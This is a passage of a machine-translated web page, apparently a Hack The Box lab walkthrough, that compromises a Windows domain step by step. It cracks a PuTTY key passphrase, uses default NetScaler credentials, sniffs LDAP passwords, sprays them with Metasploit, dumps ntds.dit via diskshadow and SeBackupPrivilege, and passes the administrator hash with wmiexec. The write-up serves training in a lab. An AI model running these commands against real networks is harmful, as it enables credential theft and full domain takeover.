<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Drapeau camouflage</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Voyons la cl√© priv√©e Putty. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/u9/kg/z-/u9kgz-0fzwj3uftpn1yjzumc5qa.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Cette cl√© priv√©e est crypt√©e et con√ßue pour l'autorisation SSH. </font><font style="vertical-align: inherit;">Passons en revue le mot de passe utilis√© pour d√©chiffrer la cl√©. </font><font style="vertical-align: inherit;">Pour ce faire, reformatez d'abord la cl√© au format john. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ui/-y/rw/ui-yrwxnm9mh_b-_p7ae2lbkbtc.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mais le tri dans les dictionnaires standard n'a pas fonctionn√©, et ils m'ont incit√© √† un excellent outil pour g√©n√©rer des mots de passe ¬´facilement saisis¬ª - </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kwprocessor</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Cr√©ons un dictionnaire.</font></font><br>
<br>
<pre><code class="bash hljs">./kwp -o key-dict.txt basechars/tiny.base keymaps/en.keymap routes/2-to-32-max-5-direction-changes.route</code></pre><br>
<img src="https://habrastorage.org/webt/xe/mz/j0/xemzj0okpereyu2ubrjiz7u7esi.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et nous avons r√©ussi √† trouver le mot de passe √† 16 caract√®res.</font></font><br>
<br>
<pre><code class="bash hljs">john --wordlist=./kwprocessor/key-dict.txt putty.john</code></pre><br>
<img src="https://habrastorage.org/webt/0v/08/p9/0v08p94zn_xex3wgqvqh55ahqyy.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
√âtant donn√© que j'ai Linux, il est plus pratique pour moi de travailler avec un client SSH standard. </font><font style="vertical-align: inherit;">Reformatez la cl√© de ce format.</font></font><br>
<br>
<pre><code class="bash hljs">sudo apt install putty-tools<font></font>
puttygen private.ppk -O private-openssh -o id_rsa</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Maintenant, nous d√©cidons o√π nous pouvons aller avec lui. </font><font style="vertical-align: inherit;">Pour ce faire, scann√© le r√©seau interne pour trouver le port ouvert 22.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains nmap -p22 172.16.249.200-205 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/fq/da/78/fqda78yhbo1nuezb5_txvnxvigg.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et nous trouvons, mais nous ne savons toujours rien de cet h√¥te. En essayant de se connecter sans nom, nous recevons un message int√©ressant et une demande de mot de passe. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/sf/gp/qs/sfgpqst6ffsugdv0biquhni5fea.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L'examen des noms des utilisateurs que nous connaissons n'a pas donn√© de r√©sultats. La num√©risation de nmap de ce service √† l'aide de scripts n'a √©galement donn√© aucun r√©sultat. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/sd/wi/y0/sdwiy0egqd4zgm4fagjeyizfmv4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ensuite, j'ai analys√© tous les ports de l'h√¥te. Mais il n'a pas attendu la fin de l'analyse, car cela a pris tr√®s longtemps, car dans les informations des cha√Ænes proxy, on pouvait observer si le port √©tait disponible ou non. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/yv/9e/ov/yv9eovdujflhzyyf9q-hsg7uphw.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Le port 80 √©tant disponible, j'ai install√© un proxy dans mon navigateur et je suis all√© voir ce qu'il y avait. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/v2/e6/v-/v2e6v-zekaxpfyu5pvagxkayeta.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous sommes accueillis par la page d'autorisation de Citrix NetScaler. Et Google nous am√®ne √† la documentation, dans laquelle nous reconnaissons la connexion par d√©faut. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/mh/cp/ha/mhcpha-tvjml8kvelevudpehacs.png"><br>
<br>
<img src="https://habrastorage.org/webt/u4/rg/zi/u4rgziapmiadlxkt9v-cnydmizo.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et avec cette connexion, nous nous connectons avec succ√®s via SSH.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/u2/kl/5b/u2kl5b92xjdgz1gfigbyvb8jgfs.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Apr√®s avoir err√© sur le serveur, j'ai regard√© des documents sur les attaques contre ce type d'√©quipement, dont la surveillance du trafic. </font><font style="vertical-align: inherit;">Ainsi, j'ai laiss√© tcpdump actif pendant un certain temps et j'ai re√ßu un vidage de trafic.</font></font><br>
<br>
<pre><code class="bash hljs">tcpdump -s0 -w r.pcap</code></pre><br>
<img src="https://habrastorage.org/webt/ur/9p/pf/ur9ppf0umalf7govd7ao_jjzc-q.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
T√©l√©chargez maintenant ce fichier.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains scp -i id_rsa nsroot@172.16.249.202:/root/r.pcap ./</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et pour trouver rapidement des informations d'identification, nous utilisons </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PCredz</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br>
<img src="https://habrastorage.org/webt/0c/lq/yn/0clqyngcfi_fxwg1onbheg9t6au.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et nous obtenons un autre drapeau.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ub/ws/mx/ubwsmxhyscpsrfy7jumcjf689la.png"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Drapeau Doppelganger</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mais ce programme ne regarde pas du tout, vous devez donc analyser le vidage pour la pr√©sence de divers secrets ou jetons. </font><font style="vertical-align: inherit;">Apr√®s avoir tri√© les paquets par protocole, nous arrivons √† LDAP et trouvons la bindRequest de deux utilisateurs qui ont un mot de passe (nous en avons d√©j√† trouv√© un). </font></font><br>
<br>
<img src="https://habrastorage.org/webt/il/ad/7_/ilad7_p_f-rbgwdrpglcejkbh74.png"><br>
<br>
<img src="https://habrastorage.org/webt/_6/w_/al/_6w_al3oddm4ikipiqi3ishgado.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
V√©rifiez ce mot de passe pour cet utilisateur.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains cme smb -u <span class="hljs-string">"netscaler-svc"</span> -p <span class="hljs-string">"#S3rvice#@cc"</span> -d htb.local 172.16.249.200 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/n_/7x/r4/n_7xr4urfsbuwry9m258zxmiczy.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Cet utilisateur n'est pas remarquable, sauf qu'il est un utilisateur du service. </font><font style="vertical-align: inherit;">Souvent, les mots de passe de ces utilisateurs co√Øncident avec les mots de passe des autres utilisateurs du domaine. </font><font style="vertical-align: inherit;">V√©rifions quels autres utilisateurs utiliseront ce mot de passe. </font><font style="vertical-align: inherit;">Je l'ai fait en utilisant metasploit.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains msfconsole 2&gt;/dev/null<font></font>
&gt; use auxiliary/scanner/smb/smb_login<font></font>
&gt; <span class="hljs-built_in">set</span> SMBDomain htb.local<font></font>
&gt; <span class="hljs-built_in">set</span> RHOSTS 172.16.249.200<font></font>
&gt; <span class="hljs-built_in">set</span> USER_FILE ~/tmp/users.txt<font></font>
&gt; <span class="hljs-built_in">set</span> PASS_FILE ~/tmp/passwords.txt<font></font>
&gt; <span class="hljs-built_in">set</span> VERBOSE <span class="hljs-literal">false</span>
&gt; run</code></pre><br>
<img src="https://habrastorage.org/webt/8l/d5/gj/8ld5gjri_mmvptxg1-cdlzc9f1e.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et ce mot de passe est all√© √† tous les comptes de service. </font><font style="vertical-align: inherit;">Comme nous l'avons d√©couvert pr√©c√©demment, le compte backup-svc est privil√©gi√©, ce qui signifie qu'il est autoris√© √† se connecter au contr√¥leur de domaine. </font><font style="vertical-align: inherit;">V√©rifiez les ports ouverts des services RDP (3389) et WinRM (5985).</font></font><br>
<br>
<pre><code class="bash hljs">proxychains nmap -p 3389,5985 172.16.249.200 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/pz/cw/5a/pzcw5asa6eqyodh4sfwa6vc9_ys.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Les deux m√©thodes de connexion sont possibles, mais je pr√©f√®re WinRM. </font><font style="vertical-align: inherit;">Connectez-vous √† l'aide du programme Evil-WinRM.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains evil-winrm -i 172.16.249.200 -u backup-svc -p <span class="hljs-string">"#S3rvice#@cc"</span> 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/lq/nx/rg/lqnxrg12wpdnbcsr9fuapynu38u.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et prenez un autre drapeau.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/5c/eu/xx/5ceuxxnpsuj3orc_35qazfwnkq0.png"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Drapeau appartenant</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Apr√®s avoir regard√© les informations sur cet utilisateur, nous voyons son appartenance √† des groupes privil√©gi√©s, afin que nous puissions copier le fichier ntds.dit et extraire les informations d'identification des utilisateurs du domaine.</font></font><br>
<br>
<pre><code class="bash hljs">whoami /all</code></pre><br>
<img src="https://habrastorage.org/webt/in/4i/a6/in4ia6lepmr0u2_voqct6h-qjw8.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Parmi les m√©thodes de vidage du fichier ntds, l'option discshadow est correctement ex√©cut√©e. </font><font style="vertical-align: inherit;">Connectons-nous en utilisant RDP. </font><font style="vertical-align: inherit;">En tant que client, j'utilise remmina.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains remmina</code></pre><br>
<img src="https://habrastorage.org/webt/1b/bv/os/1bbvosxjg1jb6y7acri98kmj47k.png"><br>
<br>
<img src="https://habrastorage.org/webt/so/ec/79/soec79bjwbiktiqfc9udby8v4g0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et nous sommes accueillis par une fen√™tre d'invite de commande. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/xl/ox/kr/xloxkreweosxvmhp56wiy4v4hms.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Entrons dans le contexte de l'ombre √† disques. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/nw/uh/ub/nwuhub-n7hnrfsm9q505cyrvrt4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et cr√©ez une copie - lecteur Z.</font></font><br>
<br>
<pre><code class="bash hljs"><span class="hljs-built_in">set</span> context persistence nowriters<font></font>
add volume c: <span class="hljs-built_in">alias</span> sss<font></font>
create <font></font>
expose %sss% z:</code></pre><br>
<img src="https://habrastorage.org/webt/ow/hv/xx/owhvxxddfioicyx-kn1frars-hs.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
V√©rifiez et voyez une copie du fichier ntds.dit. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/hp/vo/ei/hpvoeilgbsxim5ljt3nxflbmo6w.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nous avons √©galement besoin d'un fichier syst√®me pour d√©crypter la base de donn√©es ntds, mais il est plus facile de l'obtenir.</font></font><br>
<br>
<pre><code class="bash hljs">reg.exe save hklm\system C:\Users\backup-svc\Documents\system.bak</code></pre><br>
<img src="https://habrastorage.org/webt/nz/_z/16/nz_z16rrzirc0l4udjlgvny5zvm.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mais ce n'est pas tout, car le fichier ntds ne peut pas √™tre copi√© comme √ßa. </font><font style="vertical-align: inherit;">Pour ce faire, utilisez l' </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">outil suivant</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Tout d'abord, chargez les deux DLL sur l'h√¥te. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/z9/jb/d1/z9jbd1lsunkcyd3uon6v8yl3skw.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et chargez en m√©moire. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/9q/gk/cj/9qgkcjotiqguv2rhtjbci6ey1-0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Maintenant, nous activons le privil√®ge et v√©rifions qu'il est √† l'√©tat Activ√©.</font></font><br>
<br>
<pre><code class="bash hljs">Set-SeBackupPrivilege<font></font>
Whoami /priv | findstr Backup</code></pre><br>
<img src="https://habrastorage.org/webt/uu/bt/gt/uubtgtsp7zzfuvc9jyi-371bte8.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ok, copiez maintenant le fichier.</font></font><br>
<br>
<pre><code class="bash hljs">Copy-FileSeBackupPrivilege z:\windows\ntds\ntds.dit C:\Users\backup-svc\Documents\ntds.dit</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et maintenant, nous t√©l√©chargeons les ntds et les fichiers syst√®me sur l'h√¥te local ( </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">et √† ce moment le laboratoire se ferme et je perds l'acc√®s, juste pendant le t√©l√©chargement des fichiers ... Il s'est av√©r√© que le laboratoire est devenu disponible uniquement pour les utilisateurs avec un abonnement (est all√© pour une nouvelle r√©solution) et je ne peux pas terminer le passage ! Mais merci beaucoup √† @kemstat d'avoir partag√© la configuration VPN pour la dur√©e du VIP, afin que je puisse terminer ce passage</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ). </font><font style="vertical-align: inherit;">Obtenons les informations d'identification.</font></font><br>
<br>
<pre><code class="bash hljs">secretsdump.py -ntds ndts.dit -system system.bak LOCAL</code></pre><br>
<img src="https://habrastorage.org/webt/pk/jc/vt/pkjcvt3bnlmlqet3kcbewyy72ks.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Et il y a un hachage administrateur. </font><font style="vertical-align: inherit;">Utilisez maintenant l'attaque PTH pour vous connecter au serveur. </font><font style="vertical-align: inherit;">Mais psexec (connexion via SMB) nous emp√™che de lire le fichier. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/tz/c8/wp/tzc8wpvaac_btlyw3sq5mie2b1y.png"><br>
<br>
<img src="https://habrastorage.org/webt/-_/mq/jj/-_mqjjz_ybfor9th1np8b6liibs.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mais WMI nous donne un acc√®s illimit√© et nous obtenons les privil√®ges de l'administrateur de domaine et le dernier drapeau.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:822601ccd7155f47cd955b94af1558be Administrator@172.16.249.200 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/ba/y_/sd/bay_sddavamcgwmwy2hj-i819eg.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
C'est tout. </font><font style="vertical-align: inherit;">√Ä titre de r√©troaction, indiquez si vous avez appris quelque chose de nouveau dans cet article et si cela vous a √©t√© utile. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vous pouvez nous rejoindre sur </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Telegram</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Vous y trouverez du mat√©riel int√©ressant, des cours fusionn√©s ainsi que des logiciels. </font><font style="vertical-align: inherit;">Cr√©ons une communaut√© dans laquelle il y aura des gens qui connaissent bien de nombreux domaines de l'informatique, puis nous pourrons toujours nous entraider pour tout probl√®me informatique et de s√©curit√© de l'information.</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr506954/index.html">Un autre article sur Rails et ELK</a></li>
<li><a href="../fr506956/index.html">Technologie quantique et sant√©</a></li>
<li><a href="../fr506962/index.html">Async / attendre dans Unity</a></li>
<li><a href="../fr506964/index.html">D√©veloppement Android: revue de carri√®re pour mai 2020</a></li>
<li><a href="../fr506976/index.html">Pr√©sentation des scanners 3D Solutionix D500 et D700</a></li>
<li><a href="../hi486176/index.html">‡§ï‡•â‡§∞‡•ç‡§™‡•ã‡§∞‡•á‡§ü ‡§à‡§Æ‡•á‡§≤ ‡§™‡§§‡•ç‡§∞‡§æ‡§ö‡§æ‡§∞ ‡§Æ‡•á‡§Æ‡•ã</a></li>
<li><a href="../hi486178/index.html">FOSS News No. 1 - 27 ‡§ú‡§®‡§µ‡§∞‡•Ä - 2 ‡§´‡§∞‡§µ‡§∞‡•Ä, 2020 ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡•ç‡§µ‡§§‡§Ç‡§§‡•ç‡§∞ ‡§î‡§∞ ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§∏‡•ç‡§∞‡•ã‡§§ ‡§∏‡§Æ‡§æ‡§ö‡§æ‡§∞ ‡§ï‡•Ä ‡§∏‡§Æ‡•Ä‡§ï‡•ç‡§∑‡§æ</a></li>
<li><a href="../hi486180/index.html">‡§∏‡§∞‡•ç‡§µ‡§∞ ‡§∞‡§π‡§ø‡§§ ‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® ‡§¨‡§®‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡•Å‡§ù‡§æ‡§µ ‡§î‡§∞ ‡§∏‡•ç‡§∞‡•ã‡§§</a></li>
<li><a href="../hi486184/index.html">‡§™‡•ç‡§∞‡§≠‡§æ‡§µ‡•Ä ‡§¢‡§Ç‡§ó ‡§∏‡•á ‡§ñ‡•ã‡§ú ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡•à‡§∏‡•á ‡§ï‡§∞‡•á‡§Ç</a></li>
<li><a href="../hi486186/index.html">‡§™‡•ç‡§∞‡§≤‡§Ø‡§ï‡§æ‡§∞‡•Ä ‡§¨‡§æ‡§¶‡§≤: ‡§Ø‡§π ‡§ï‡•à‡§∏‡•á ‡§ï‡§æ‡§Æ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>